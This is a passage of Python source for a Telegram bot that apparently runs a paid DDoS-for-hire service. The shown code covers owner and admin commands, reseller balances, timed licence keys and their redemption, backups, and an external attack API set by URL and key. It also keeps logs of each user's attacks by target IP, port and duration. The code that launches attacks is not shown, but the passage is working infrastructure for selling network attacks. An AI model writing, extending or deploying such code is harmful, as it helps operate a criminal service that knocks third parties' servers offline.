            "┃  /transfer_balance from to    ┃\n"
            "┃  amount                       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['reseller_keys'])
def reseller_keys(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /reseller_keys user_id    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    uid = parts[1]
    keys_db = data.get("keys", {})
    
    # Create file with all keys
    import io
    file_content = f"─── RESELLER {uid} KEYS ───\n\n"
    
    for key, info in keys_db.items():
        if info.get("generated_by") == uid:
            status = info.get("status", "active")
            dur = info.get("duration_str", "Unknown")
            created = info.get("created_at", "Unknown")
            if status == "redeemed":
                redeemed_by = info.get("redeemed_by", "Unknown")
                redeemed_at = info.get("redeemed_at", "Unknown")
                file_content += f"KEY: {key}\nDURATION: {dur}\nSTATUS: REDEEMED\nREDEEMED BY: {redeemed_by}\nREDEEMED AT: {redeemed_at}\n\n"
            else:
                file_content += f"KEY: {key}\nDURATION: {dur}\nSTATUS: {status.upper()}\nCREATED: {created}\n\n"
    
    if len(file_content) < 100:
        file_content += "No keys found for this reseller."
    
    file_bio = io.BytesIO(file_content.encode('utf-8'))
    file_bio.name = f"reseller_{uid}_keys.txt"
    bot.send_document(message.chat.id, file_bio)

# ═══════════════════════════════════════════════════════════════════════════
#                          ADMIN MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['add_admin'])
def add_admin(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /add_admin user_id        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        uid = int(parts[1])
        if "admins" not in data:
            data["admins"] = []
        if uid not in data["admins"] and uid not in BOT_OWNERS:
            data["admins"].append(uid)
            save_data()
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ADMIN ADDED!              ┃\n"
                f"┃  👤 {uid}                    ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ⚠️ USER IS ALREADY ADMIN     ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID!          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['remove_admin'])
def remove_admin(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /remove_admin user_id     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        uid = int(parts[1])
        if "admins" in data and uid in data["admins"]:
            data["admins"].remove(uid)
            save_data()
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ ADMIN REMOVED!            ┃\n"
                f"┃  👤 {uid}                    ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ USER IS NOT AN ADMIN      ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID!          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['admin_list'])
def admin_list(message):
    if not is_owner(message.from_user.id):
        return
    
    admins = data.get("admins", [])
    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  👑 ADMIN LIST                ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    for i, uid in enumerate(admins, 1):
        text += f"┃  {i}. {uid}\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['user_info'])
def user_info_command(message):
    if not is_admin(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /user_info user_id        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        uid = int(parts[1])
        str_uid = str(uid)
        users = data.get("users", {})
        
        if str_uid in users:
            expiry = users[str_uid].get("expiry_time", "No plan")
            days = get_days_remaining(uid)
            text = (
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ℹ️ USER INFO                 ┃\n"
                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                f"┃  👤 ID: {uid}\n"
                f"┃  📅 EXPIRY: {expiry[:10]}\n"
                f"┃  ⏳ DAYS LEFT: {days}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>"
            )
        else:
            text = (
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ℹ️ USER INFO                 ┃\n"
                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                f"┃  👤 ID: {uid}\n"
                f"┃  📅 NO ACTIVE PLAN           ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>"
            )
        bot.reply_to(message, text, parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID!          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['reset_user'])
def reset_user(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /reset_user user_id       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        uid = int(parts[1])
        str_uid = str(uid)
        users = data.get("users", {})
        
        if str_uid in users:
            users[str_uid]["expiry_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_data()
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ✅ USER {uid} RESET!          ┃\n"
                f"┃  Plan has been expired.       ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ USER {uid} NOT FOUND!     ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID USER ID!          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        
# ═══════════════════════════════════════════════════════════════════════════
#                          VIDEO MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['add_video'])
def add_video(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /add_video url            ┃\n"
            "┃  Example: /add_video https:// ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    url = parts[1]
    if "videos" not in data:
        data["videos"] = []
    data["videos"].append(url)
    save_data()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ✅ VIDEO ADDED!              ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  Total videos: {len(data['videos'])} ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

@bot.message_handler(commands=['del_video'])
def del_video(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /del_video index          ┃\n"
            "┃  Use /list_videos to see      ┃\n"
            "┃  the index numbers            ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        index = int(parts[1]) - 1
        if "videos" not in data or index < 0 or index >= len(data["videos"]):
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ INVALID INDEX!            ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return
        
        removed = data["videos"].pop(index)
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ VIDEO REMOVED!            ┃\n"
            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  Remaining: {len(data['videos'])} ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID INDEX!            ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['list_videos'])
def list_videos(message):
    if not is_owner(message.from_user.id):
        return
    
    videos = data.get("videos", [])
    if not videos:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO VIDEOS FOUND           ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Use /add_video to add        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  🎬 VIDEO LIST                ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    for i, url in enumerate(videos[:20], 1):
        short_url = url[:35] + "..." if len(url) > 35 else url
        text += f"┃  {i}. {short_url}\n"
    
    if len(videos) > 20:
        text += f"┃  ... and {len(videos)-20} more\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          LOGGING & MONITORING
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['logs'])
def view_logs(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    limit = 20
    if len(parts) == 2:
        try:
            limit = int(parts[1])
            if limit > 100:
                limit = 100
        except:
            pass
    
    logs = data.get("attack_logs", [])[-limit:]
    
    if not logs:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO ATTACK LOGS FOUND      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    text = f"<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  📋 LAST {len(logs)} ATTACK LOGS     ┃\n"
    text += f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    for log in reversed(logs):
        username = log.get("username", "Unknown")[:10]
        target = log.get("target", "Unknown")
        port = log.get("port", "0")
        dur = log.get("duration", "0")
        text += f"┃  👤 {username} → {target}:{port} ({dur}s)\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not is_owner(message.from_user.id):
        return
    
    users = len(data.get("users", {}))
    active_users = 0
    now = datetime.now()
    
    for uid, udata in data.get("users", {}).items():
        expiry_str = udata.get("expiry_time")
        if expiry_str:
            try:
                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                if expiry > now:
                    active_users += 1
            except:
                pass
    
    keys = len(data.get("keys", {}))
    redeemed_keys = sum(1 for k in data.get("keys", {}).values() if k.get("status") == "redeemed")
    resellers = len(data.get("resellers", {}))
    admins = len(data.get("admins", []))
    attacks = len(data.get("attack_logs", []))
    
    text = (
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📊 BOT STATISTICS            ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  👥 TOTAL USERS: {users}\n"
        f"┃  ✅ ACTIVE USERS: {active_users}\n"
        f"┃  🔑 TOTAL KEYS: {keys}\n"
        f"┃  🎫 REDEEMED KEYS: {redeemed_keys}\n"
        f"┃  💼 RESELLERS: {resellers}\n"
        f"┃  👑 ADMINS: {admins}\n"
        f"┃  🚀 TOTAL ATTACKS: {attacks}\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  ⚙️ SETTINGS:                 ┃\n"
        f"┃  📝 FEEDBACK REQUIRED: {'✅' if data.get('feedback_required', True) else '❌'}\n"
        f"┃  ⏱️ COOLDOWN ENABLED: {'✅' if data.get('cooldown_enabled', True) else '❌'}\n"
        f"┃  🛡️ SPAM PROTECTION: {'✅' if data.get('spam_protection', True) else '❌'}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['uptime'])
def uptime_command(message):
    if not is_owner(message.from_user.id):
        return
    
    import time
    uptime_seconds = int(time.time() - start_time)
    days = uptime_seconds // 86400
    hours = (uptime_seconds % 86400) // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60
    
    text = (
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ⏰ BOT UPTIME                 ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  {days}d {hours}h {minutes}m {seconds}s\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['system_info'])
def system_info(message):
    if not is_owner(message.from_user.id):
        return
    
    import platform
    import sys
    
    text = (
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  💻 SYSTEM INFO               ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  OS: {platform.system()} {platform.release()}\n"
        f"┃  PYTHON: {sys.version.split()[0]}\n"
        f"┃  DATA FILE: {DATA_FILE}\n"
        f"┃  USERS: {len(data.get('users', {}))}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          API MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['set_api'])
def set_api(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /set_api url key          ┃\n"
            "┃  Example: /set_api https://  ┃\n"
            "┃  your-api.com key_here       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    api_url = parts[1]
    api_key = parts[2]
    
    data["api_url"] = api_url
    data["api_key"] = api_key
    save_data()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ✅ API SETTINGS UPDATED!     ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  URL: {api_url[:40]}...\n"
        f"┃  KEY: {api_key[:20]}...\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

@bot.message_handler(commands=['show_api'])
def show_api(message):
    if not is_owner(message.from_user.id):
        return
    
    api_url = data.get("api_url", DEFAULT_API_URL)
    api_key = data.get("api_key", DEFAULT_API_KEY)
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  🔧 CURRENT API SETTINGS      ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  URL: {api_url}\n"
        f"┃  KEY: {api_key}\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          SPAM PROTECTION TOGGLE
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['spam_toggle'])
def spam_toggle(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /spam_toggle on/off       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    state = parts[1].lower() == 'on'
    data["spam_protection"] = state
    save_data()
    
    status = "ENABLED" if state else "DISABLED"
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  🛡️ SPAM PROTECTION: {status}   ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          BACKUP & RESTORE
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['backup'])
def backup_data(message):
    if not is_owner(message.from_user.id):
        return
    
    import io
    import json
    
    # Create backup file
    backup_content = json.dumps(data, indent=2, default=str)
    backup_bio = io.BytesIO(backup_content.encode('utf-8'))
    backup_bio.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    bot.send_document(message.chat.id, backup_bio,
        caption="<pre>\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  💾 BACKUP CREATED!           ┃\n"
        "┃  Save this file securely.     ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['restore'])
def restore_data(message):
    if not is_owner(message.from_user.id):
        return
    
    if message.reply_to_message and message.reply_to_message.document:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        try:
            restored_data = json.loads(downloaded_file.decode('utf-8'))
            global data
            data = restored_data
            save_data()
            
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ✅ DATA RESTORED!            ┃\n"
                "┃  Bot has been restored from  ┃\n"
                "┃  the backup file.            ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
        except Exception as e:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ RESTORE FAILED!           ┃\n"
                f"┃  Error: {str(e)[:30]}...       ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ REPLY TO A BACKUP FILE    ┃\n"
            "┃     WITH /restore             ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          REDEEM & GEN COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['gen'])
def generate_key_cmd(message):
    user_id = message.from_user.id
    is_reseller = str(user_id) in data.get("resellers", {})
    
    if not is_owner(user_id) and not is_reseller:
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ USAGE ERROR               ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  /gen duration                ┃\n"
            "┃  or /gen name duration        ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Durations: 1h,12h,1d,7d,1m   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    if len(parts) == 2:
        duration_str = parts[1]
        key_name = "K" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    else:
        key_name = parts[1]
        duration_str = parts[2]
        if not is_owner(user_id):
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ❌ ACCESS DENIED             ┃\n"
                "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                "┃  Only owner can name keys     ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
            return

    if is_reseller and not is_owner(user_id):
        reseller_data = data["resellers"].get(str(user_id), {})
        custom_rates = reseller_data.get("custom_rates", {})
        rates = data.get("rates", {})
        
        if duration_str in custom_rates:
            cost = custom_rates[duration_str]
        elif duration_str in rates:
            cost = rates[duration_str]
        else:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ INVALID DURATION          ┃\n"
                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                f"┃  Available: {', '.join(rates.keys())} ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            return
        
        reseller_balance = reseller_data.get("balance", 0)
        
        if reseller_balance < cost:
            bot.reply_to(message,
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  ❌ INSUFFICIENT BALANCE      ┃\n"
                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                f"┃  COST: {cost}  │ BALANCE: {reseller_balance} ┃\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            return
        
        data["resellers"][str(user_id)]["balance"] -= cost

    try:
        duration_secs = parse_duration(duration_str)
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID DURATION FORMAT   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    generated_by = str(user_id) if not is_owner(user_id) else "Owner"
    data["keys"][key_name] = {
        "duration": duration_secs,
        "duration_str": duration_str,
        "generated_by": generated_by,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_data()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ✅ KEY GENERATED!            ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  🔑 {key_name}                ┃\n"
        f"┃  ⏱️ {duration_str}             ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  /redeem {key_name}           ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    parts = message.text.split()
    
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ USAGE ERROR               ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  /redeem key                  ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    key = parts[1]
    keys_db = data.get("keys", {})
    
    if key not in keys_db:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID OR EXPIRED KEY    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    if keys_db[key].get("status") == "banned":
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🚫 THIS KEY HAS BEEN BANNED  ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    if keys_db[key].get("status") == "redeemed":
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ KEY ALREADY REDEEMED      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    duration_secs = keys_db[key]["duration"]
    duration_str = keys_db[key].get("duration_str", f"{duration_secs}s")
    
    users_db = data.get("users", {})
    if user_id not in users_db:
        users_db[user_id] = {}
    
    current_expiry_str = users_db[user_id].get("expiry_time")
    now = datetime.now()
    
    if current_expiry_str:
        try:
            current_expiry = datetime.strptime(current_expiry_str, "%Y-%m-%d %H:%M:%S")
            if current_expiry > now:
                new_expiry = current_expiry + timedelta(seconds=duration_secs)
            else:
                new_expiry = now + timedelta(seconds=duration_secs)
        except:
            new_expiry = now + timedelta(seconds=duration_secs)
    else:
        new_expiry = now + timedelta(seconds=duration_secs)
    
    users_db[user_id]["expiry_time"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
    
    keys_db[key]["status"] = "redeemed"
    keys_db[key]["redeemed_by"] = user_id
    keys_db[key]["redeemed_at"] = now.strftime("%Y-%m-%d %H:%M:%S")
    save_data()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
